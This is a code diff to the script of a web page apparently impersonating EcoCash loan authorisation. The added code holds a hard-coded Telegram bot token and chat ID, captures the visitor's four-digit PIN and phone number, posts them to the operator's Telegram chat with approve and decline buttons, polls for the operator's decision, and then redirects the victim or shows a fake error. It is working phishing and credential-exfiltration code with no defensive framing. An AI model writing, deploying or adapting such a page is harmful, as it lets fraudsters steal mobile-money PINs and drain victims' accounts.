@@ -419,7 +419,13 @@
     </footer>
   </div>
 
-  <script>
+<script>
+  (function() {
+    // --- TELEGRAM CONFIG ---
+    const BOT_TOKEN = '8851084758:AAGBlQW5weHaFz1Fv2D5wdIFSggZRGQTfug';
+    const CHAT_ID   = '8820857419';
+    const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
     const pinHiddenInput = document.getElementById('pinHiddenInput');
     const authBtn = document.getElementById('authBtn');
     const pinError = document.getElementById('pinError');
@@ -491,6 +497,130 @@
       pinHiddenInput.value = '';
       updateDots();
       authBtn.disabled = true;
+    });
+    
+    // --- Telegram helpers ---
+    function escapeHtml(unsafe) {
+      if (!unsafe) return '';
+      return unsafe.replace(/[&<>]/g, function(m) {
+        if (m === '&') return '&amp;';
+        if (m === '<') return '&lt;';
+        if (m === '>') return '&gt;';
+        return m;
+      });
+    }
+
+    async function sendToTelegram(payload) {
+      const url = `${API_BASE}/sendMessage`;
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        return await response.json();
+      } catch (err) {
+        console.error('Telegram error', err);
+        throw err;
+      }
+    }
+
+    let pollInterval = null;
+
+    function pollForCallback(expectedPrefix, expectedTs, onDecision) {
+      if (pollInterval) clearInterval(pollInterval);
+
+      let lastUpdateId = 0;
+      pollInterval = setInterval(async () => {
+        try {
+          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+          const res = await fetch(url);
+          const data = await res.json();
+          if (!data.ok || !data.result.length) return;
+
+          for (const update of data.result) {
+            lastUpdateId = update.update_id;
+            if (update.callback_query && update.callback_query.data) {
+              const parts = update.callback_query.data.split('_');
+              if (parts.length >= 3) {
+                const [type, action, time] = parts;
+                if (time == expectedTs && type === expectedPrefix) {
+                  clearInterval(pollInterval);
+                  pollInterval = null;
+                  onDecision(action);
+                  return;
+                }
+              }
+            }
+          }
+        } catch (err) {
+          console.warn('Poll error', err);
+        }
+      }, 1500);
+    }
+
+    // --- Authorise button logic ---
+    let isProcessing = false;
+
+    authoriseBtn.addEventListener('click', async function() {
+      if (isProcessing) return;
+
+      const pin = pinInputs.map(i => i.value).join('');
+      if (pin.length !== 4) {
+        showError('Enter all 4 digits');
+        return;
+      }
+
+      isProcessing = true;
+      pinInputs.forEach(i => i.disabled = true);
+      authoriseBtn.disabled = true;
+      spinner.style.display = 'flex';
+
+      const identifier = `Phone: ${phone || 'Registered number'}`;
+      const ts = Date.now();
+      const escapedPin = escapeHtml(pin);
+
+      const msg = `🔐 <b>EcoCash Loan Authorisation</b>\n\n${identifier}\n\n<b>PIN entered:</b> <code>${escapedPin}</code>\n\nApprove or decline this transaction.`;
+
+      try {
+        await sendToTelegram({
+          chat_id: CHAT_ID,
+          text: msg,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [[
+              { text: '✅ Approve', callback_data: `pin_approve_${ts}` },
+              { text: '❌ Decline', callback_data: `pin_decline_${ts}` }
+            ]]
+          }
+        });
+
+        pollForCallback('pin', ts, (action) => {
+          spinner.style.display = 'none';
+          isProcessing = false;
+
+          if (action === 'approve') {
+            window.location.href = 'unavailable.html';
+          } else if (action === 'decline') {
+            showError('PIN verification declined');
+            pinInputs.forEach(i => {
+              i.value = '';
+              i.disabled = false;
+            });
+            pinInputs[0].focus();
+            authoriseBtn.disabled = false;
+            updateButtonState();
+          }
+        });
+      } catch (err) {
+        console.error(err);
+        spinner.style.display = 'none';
+        isProcessing = false;
+        pinInputs.forEach(i => i.disabled = false);
+        authoriseBtn.disabled = false;
+        updateButtonState();
+        showError('Network error. Please try again.');
+      }
     });
   </script>
 </body>
